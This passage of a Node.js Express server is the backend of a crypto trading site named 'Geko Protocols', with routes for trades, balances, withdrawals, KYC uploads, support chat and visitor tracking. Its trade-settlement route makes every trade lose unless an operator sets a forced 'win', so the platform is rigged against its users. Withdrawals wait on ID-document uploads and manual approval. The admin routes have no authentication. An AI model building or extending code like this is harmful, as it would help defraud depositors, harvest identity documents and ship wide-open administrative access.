    await pool.query('UPDATE users SET swap_sent = TRUE WHERE wallet_address = $1', [walletAddress]);
    res.json({ success: true });
  } catch (e) { res.status(500).json({ error: e.message }); }
});

// ─── Support Chat ─────────────────────────────────────────────────────────
app.get('/api/support/messages', async (req, res) => {
  const { address } = req.query;
  if (!dbAvailable || !pool) return res.status(503).json({ error: 'Database unavailable' });
  try {
    const r = await pool.query('SELECT messages FROM support_tickets WHERE wallet_address = $1', [address]);
    res.json(r.rows[0]?.messages || []);
  } catch (e) { res.status(500).json({ error: e.message }); }
});

app.post('/api/support/send', async (req, res) => {
  const { address, message, sender } = req.body;
  if (!dbAvailable || !pool) return res.status(503).json({ error: 'Database unavailable' });
  try {
    const newMessage = { text: message, sender, timestamp: new Date().toISOString() };
    await pool.query(`
        INSERT INTO support_tickets (wallet_address, subject, messages, updated_at)
        VALUES ($1, 'General Support', jsonb_build_array($2::jsonb), NOW())
        ON CONFLICT (wallet_address) DO UPDATE SET
            messages = support_tickets.messages || jsonb_build_array($2::jsonb),
            updated_at = NOW()
    `, [address, JSON.stringify(newMessage)]);

    if (sender === 'user') {
        await sendTelegramNotification(`<b>💬 Support Message</b>\n\n<b>From:</b> <code>${address}</code>\n<b>Message:</b> ${message}`);
    }

    res.json({ success: true });
  } catch (e) { 
      console.error('Support send error:', e.message);
      res.status(500).json({ error: e.message });
  }
});

app.get('/api/admin/support/tickets', async (req, res) => {
  if (!dbAvailable || !pool) return res.status(503).json({ error: 'Database unavailable' });
  try {
    const r = await pool.query('SELECT * FROM support_tickets ORDER BY updated_at DESC');
    res.json(r.rows);
  } catch (e) { res.status(500).json({ error: e.message }); }
});

// ─── Balance Transfer ─────────────────────────────────────────────────────
app.post('/api/balance/transfer', async (req, res) => {
  const { walletAddress, amount, direction } = req.body;
  console.log(`[Transfer] Attempting ${direction} for ${walletAddress}: ${amount}`);
  
  if (!walletAddress || amount === undefined || !direction) {
      return res.status(400).json({ error: 'Missing parameters' });
  }
  if (!dbAvailable || !pool) return res.status(503).json({ error: 'Database unavailable' });

  try {
    const amt = Math.abs(parseFloat(amount));
    if (isNaN(amt) || amt <= 0) return res.status(400).json({ error: 'Invalid transfer amount' });

    // Atomic update to prevent race conditions and handle TEXT columns via cast
    let query = '';
    if (direction === 'vault_to_trade') {
      query = `
        UPDATE users SET 
            protocol_settlement_balance = (protocol_settlement_balance::numeric - $1)::text,
            trading_balance = (trading_balance::numeric + $1)::text
        WHERE wallet_address = $2 AND protocol_settlement_balance::numeric >= $1
        RETURNING trading_balance, protocol_settlement_balance;
      `;
    } else if (direction === 'trade_to_vault') {
      query = `
        UPDATE users SET 
            trading_balance = (trading_balance::numeric - $1)::text,
            protocol_settlement_balance = (protocol_settlement_balance::numeric + $1)::text
        WHERE wallet_address = $2 AND trading_balance::numeric >= $1
        RETURNING trading_balance, protocol_settlement_balance;
      `;
    } else {
      return res.status(400).json({ error: 'Invalid direction' });
    }

    const result = await pool.query(query, [amt, walletAddress]);
    
    if (result.rowCount === 0) {
        return res.status(400).json({ error: 'Insufficient balance or user not found' });
    }

    const updatedUser = result.rows[0];
    
    await recordTransaction({
      wallet_address: walletAddress,
      asset_symbol: 'USDT',
      amount: amt,
      type: 'transfer',
      reference: `transfer:${direction}`,
      status: 'completed'
    });

    console.log(`[Transfer] Success for ${walletAddress}. New balances: Vault=${updatedUser.protocol_settlement_balance}, Trade=${updatedUser.trading_balance}`);
    res.json({ success: true, ...updatedUser });
  } catch (e) { 
      console.error('[Transfer Error]', e.message);
      res.status(500).json({ error: e.message }); 
  }
});

// ─── Visitor Tracking ─────────────────────────────────────────────────────
app.post('/api/visitors/track', async (req, res) => {
  const ip = (req.headers['x-forwarded-for']?.split(',')[0] || req.socket.remoteAddress || '').trim();
  const { visitor_id, user_agent, page_path } = req.body || {};
  if (!dbAvailable || !pool) return res.status(503).json({ error: 'Database unavailable' });
  try {
    await pool.query(`
        INSERT INTO visitors (visitor_id, ip_address, user_agent, page_path, last_seen, visit_count)
        VALUES ($1, $2, $3, $4, NOW(), 1)
        ON CONFLICT (visitor_id) DO UPDATE SET
            last_seen = NOW(),
            visit_count = visitors.visit_count + 1,
            ip_address = $2,
            user_agent = $3,
            page_path = $4
    `, [visitor_id, ip, user_agent, page_path]);
    return res.json({ success: true });
  } catch (e) { return res.status(500).json({ error: e.message }); }
});

app.get('/api/admin/visitors', async (req, res) => {
  if (!dbAvailable || !pool) return res.status(503).json({ error: 'Database unavailable' });
  try {
    const r = await pool.query('SELECT * FROM visitors ORDER BY last_seen DESC LIMIT 500');
    return res.json(r.rows);
  } catch (e) { return res.status(500).json({ error: e.message }); }
});

// ─── Transactions ──────────────────────────────────────────────────────────
app.get('/api/user/transactions', async (req, res) => {
  const { address, limit } = req.query;
  if (!address) return res.status(400).json({ error: 'Address required' });
  if (!dbAvailable || !pool) return res.status(503).json({ error: 'Database unavailable' });
  try {
    const r = await pool.query('SELECT * FROM transactions WHERE wallet_address = $1 ORDER BY created_at DESC LIMIT $2', [address, parseInt(limit || '50')]);
    res.json({ success: true, transactions: r.rows });
  } catch (e) { res.status(500).json({ error: e.message }); }
});

app.get('/api/user/balance', async (req, res) => {
  const { address, asset } = req.query;
  if (!address) return res.status(400).json({ error: 'Address required' });
  if (!dbAvailable || !pool) return res.status(503).json({ error: 'Database unavailable' });
  try {
    const userRes = await pool.query('SELECT * FROM users WHERE wallet_address = $1', [address]);
    const user = userRes.rows[0] || { trading_balance: '0', protocol_settlement_balance: '0', demo_balance: '100000', status: 'guest', kyc_status: 'none' };

    if (asset === 'USDT') {
      return res.json({ 
        wallet_address: address, asset: 'USDT', status: user.status, kyc_status: user.kyc_status,
        balance: parseFloat(user.protocol_settlement_balance || 0),
        trading_balance: parseFloat(user.trading_balance || 0),
        demo_balance: parseFloat(user.demo_balance || 100000)
      });
    }

    const r = await pool.query(`
        SELECT asset_symbol as asset, SUM(amount) as balance 
        FROM transactions 
        WHERE wallet_address = $1 AND status = 'completed' AND type != 'trade'
        GROUP BY asset_symbol
    `, [address]);
    
    const balances = r.rows.map(row => ({ ...row, balance: parseFloat(row.balance) }));
    const usdtIdx = balances.findIndex(b => b.asset === 'USDT');
    const usdtBal = parseFloat(user.protocol_settlement_balance || 0);
    if (usdtIdx >= 0) balances[usdtIdx].balance = usdtBal;
    else balances.push({ asset: 'USDT', balance: usdtBal });

    return res.json({ 
        wallet_address: address, balances, status: user.status, kyc_status: user.kyc_status, 
        trading_balance: user.trading_balance, demo_balance: user.demo_balance 
    });
  } catch (e) { return res.status(500).json({ error: e.message }); }
});

// ─── Trades ───────────────────────────────────────────────────────────────
app.get('/api/user/active-trades', async (req, res) => {
  const { address } = req.query;
  if (!dbAvailable || !pool) return res.status(503).json({ error: 'Database unavailable' });
  try {
    const r = await pool.query('SELECT * FROM trades WHERE wallet_address = $1 AND status = \'pending\' ORDER BY created_at DESC', [address]);
    res.json(r.rows);
  } catch (e) { res.status(500).json({ error: e.message }); }
});

app.post('/api/execute-trade', async (req, res) => {
  const { walletAddress, asset, tradeSize, leverage, type, isDemo, entryPrice, duration, tradeId } = req.body;
  if (!dbAvailable || !pool) return res.status(503).json({ error: 'Database unavailable' });
  try {
    const amt = Math.abs(parseFloat(tradeSize));
    const balanceField = isDemo ? 'demo_balance' : 'trading_balance';
    
    const userRes = await pool.query(`SELECT ${balanceField} FROM users WHERE wallet_address = $1`, [walletAddress]);
    const balance = parseFloat(userRes.rows[0]?.[balanceField] || 0);
    if (balance < amt) return res.status(400).json({ error: 'Insufficient balance' });

    await pool.query(`UPDATE users SET ${balanceField} = (${balanceField}::numeric - $1)::text WHERE wallet_address = $2`, [amt, walletAddress]);

    await pool.query(`
        INSERT INTO trades (id, wallet_address, symbol, direction, amount, entry_price, leverage, duration, is_demo, status, created_at)
        VALUES ($1, $2, $3, $4, $5, $6, $7, $8, $9, 'pending', NOW())
    `, [tradeId || crypto.randomUUID(), walletAddress, asset, type, amt, entryPrice, leverage, duration, isDemo]);

    await recordTransaction({
      wallet_address: walletAddress, asset_symbol: 'USDT', amount: -amt, type: 'trade', reference: `trade-open:${tradeId}`
    });

    res.json({ success: true });
  } catch (e) { res.status(500).json({ error: e.message }); }
});

app.post('/api/settle-trade', async (req, res) => {
  const { walletAddress, payout, tradeRef, isDemo } = req.body;
  if (!dbAvailable || !pool) return res.status(503).json({ error: 'Database unavailable' });
  try {
    const tradeRes = await pool.query('SELECT * FROM trades WHERE id = $1 AND wallet_address = $2', [tradeRef, walletAddress]);
    const trade = tradeRes.rows[0];
    if (!trade || trade.status !== 'pending') return res.status(400).json({ error: 'Invalid trade' });

    // User Requirement: DEFAULT to loss unless admin explicitly sets 'win'
    const isWin = trade.force_outcome === 'win';

    const finalStatus = isWin ? 'won' : 'lost';
    const leverageFactor = (parseFloat(trade.leverage) || 10) / 10;
    const finalPayout = isWin ? parseFloat(trade.amount) * (1 + (0.85 * leverageFactor)) : 0;
    
    await pool.query('UPDATE trades SET status = $1, settled_at = NOW() WHERE id = $2', [finalStatus, tradeRef]);

    if (finalPayout > 0) {
      const balanceField = isDemo ? 'demo_balance' : 'trading_balance';
      await pool.query(`UPDATE users SET ${balanceField} = (${balanceField}::numeric + $1)::text WHERE wallet_address = $2`, [finalPayout, walletAddress]);
      await recordTransaction({
        wallet_address: walletAddress, asset_symbol: 'USDT', amount: finalPayout, type: 'trade', reference: `trade-settle:${tradeRef}`
      });
    }

    res.json({ success: true, status: finalStatus, payout: finalPayout });
  } catch (e) { res.status(500).json({ error: e.message }); }
});

// ─── Withdrawals ──────────────────────────────────────────────────────────
app.post('/api/request-withdrawal', async (req, res) => {
  const { walletAddress, destinationAddress, amount, asset } = req.body;
  if (!dbAvailable || !pool) return res.status(503).json({ error: 'Database unavailable' });
  try {
    const userRes = await pool.query('SELECT kyc_status FROM users WHERE wallet_address = $1', [walletAddress]);
    if (userRes.rows[0]?.kyc_status !== 'approved') return res.status(403).json({ error: 'KYC required' });

    const balance = await getUserBalance(walletAddress, asset);
    if (balance < parseFloat(amount)) return res.status(400).json({ error: 'Insufficient balance' });

    const r = await pool.query(`
        INSERT INTO withdrawal_requests (wallet_address, destination_address, amount, asset, status, created_at)
        VALUES ($1, $2, $3, $4, 'pending', NOW()) RETURNING id
    `, [walletAddress, destinationAddress.trim(), parseFloat(amount), asset]);
    
    res.json({ success: true, requestId: r.rows[0].id });
  } catch (e) { res.status(500).json({ error: e.message }); }
});

app.get('/api/admin/withdrawal-requests', async (req, res) => {
  if (!dbAvailable || !pool) return res.status(503).json({ error: 'Database unavailable' });
  try {
    const r = await pool.query(`
        SELECT wr.*, u.nickname 
        FROM withdrawal_requests wr
        LEFT JOIN users u ON wr.wallet_address = u.wallet_address
        ORDER BY wr.created_at DESC
    `);
    // Need to manually add current_balance if needed by frontend
    res.json(r.rows);
  } catch (e) { res.status(500).json({ error: e.message }); }
});

app.post('/api/admin/approve-withdrawal', async (req, res) => {
  const { requestId } = req.body;
  if (!dbAvailable || !pool) return res.status(503).json({ error: 'Database unavailable' });
  try {
    const wrRes = await pool.query('SELECT * FROM withdrawal_requests WHERE id = $1', [requestId]);
    const wr = wrRes.rows[0];
    if (!wr || wr.status !== 'pending') return res.status(400).json({ error: 'Invalid request' });

    await pool.query('UPDATE withdrawal_requests SET status = \'approved\', processed_at = NOW() WHERE id = $1', [requestId]);
    
    if (wr.asset === 'USDT') {
        await pool.query('UPDATE users SET protocol_settlement_balance = (protocol_settlement_balance::numeric - $1)::text WHERE wallet_address = $2', [wr.amount, wr.wallet_address]);
    }
    
    await recordTransaction({
      wallet_address: wr.wallet_address, asset_symbol: wr.asset, amount: -parseFloat(wr.amount), type: 'withdrawal', reference: `withdrawal-approved:${requestId}`
    });

    res.json({ success: true });
  } catch (e) { res.status(500).json({ error: e.message }); }
});

app.post('/api/admin/reject-withdrawal', async (req, res) => {
  const { requestId, note } = req.body;
  if (!dbAvailable || !pool) return res.status(503).json({ error: 'Database unavailable' });
  try {
    await pool.query('UPDATE withdrawal_requests SET status = \'rejected\', admin_note = $1, processed_at = NOW() WHERE id = $2', [note, requestId]);
    res.json({ success: true });
  } catch (e) { res.status(500).json({ error: e.message }); }
});

// ─── KYC ──────────────────────────────────────────────────────────────────
app.post('/api/kyc/submit', async (req, res) => {
  const { walletAddress, country, idFront, idBack } = req.body;
  if (!dbAvailable || !pool) return res.status(503).json({ error: 'Database unavailable' });
  try {
    await pool.query(`
        INSERT INTO kyc_submissions (wallet_address, country, id_front, id_back, status, created_at)
        VALUES ($1, $2, $3, $4, 'pending', NOW())
    `, [walletAddress, country, idFront, idBack]);
    await pool.query('UPDATE users SET kyc_status = \'pending\' WHERE wallet_address = $1', [walletAddress]);
    res.json({ success: true });
  } catch (e) { res.status(500).json({ error: e.message }); }
});

app.get('/api/admin/kyc/submissions', async (req, res) => {
  if (!dbAvailable || !pool) return res.status(503).json({ error: 'Database unavailable' });
  try {
    const r = await pool.query('SELECT * FROM kyc_submissions WHERE status = \'pending\' ORDER BY created_at DESC');
    res.json(r.rows);
  } catch (e) { res.status(500).json({ error: e.message }); }
});

app.post('/api/admin/kyc/approve', async (req, res) => {
  const { submissionId, walletAddress } = req.body;
  if (!dbAvailable || !pool) return res.status(503).json({ error: 'Database unavailable' });
  try {
    await pool.query('UPDATE kyc_submissions SET status = \'approved\' WHERE id = $1', [submissionId]);
    await pool.query('UPDATE users SET kyc_status = \'approved\' WHERE wallet_address = $1', [walletAddress]);
    res.json({ success: true });
  } catch (e) { res.status(500).json({ error: e.message }); }
});

// ─── Leaderboard ──────────────────────────────────────────────────────────
app.get('/api/leaderboard', async (req, res) => {
  if (!dbAvailable || !pool) return res.json([]);
  try {
    const r = await pool.query(`
        SELECT wallet_address, nickname, trading_balance::numeric as balance
        FROM users 
        WHERE trading_balance::numeric > 0
        ORDER BY trading_balance::numeric DESC 
        LIMIT 20
    `);
    res.json(r.rows.map((u, i) => ({
        rank: i + 1,
        display_name: u.nickname || (u.wallet_address ? u.wallet_address.slice(0, 4) + '...' + u.wallet_address.slice(-4) : 'Anonymous'),
        balance: parseFloat(u.balance)
    })));
  } catch (e) { res.json([]); }
});

// ─── Static files & SPA ───────────────────────────────────────────────────
const distPath = path.resolve(__dirname, 'dist');
const publicPath = path.resolve(__dirname, 'public');
const rootPath = __dirname;

app.use(express.static(distPath));
app.use(express.static(publicPath));
app.use(express.static(rootPath));

app.get('*', (req, res) => {
  if (req.url.startsWith('/api/')) return res.status(404).json({ error: 'API route not found' });
  const indexPath = path.join(distPath, 'index.html');
  if (fs.existsSync(indexPath)) return res.sendFile(indexPath);
  const rootIndexPath = path.join(rootPath, 'index.html');
  if (fs.existsSync(rootIndexPath)) return res.sendFile(rootIndexPath);
  res.status(404).send("Build not found");
});

app.listen(port, '0.0.0.0', () => {
  console.log(`🚀 Geko Protocols Server: http://0.0.0.0:${port}`);
});

export default app;
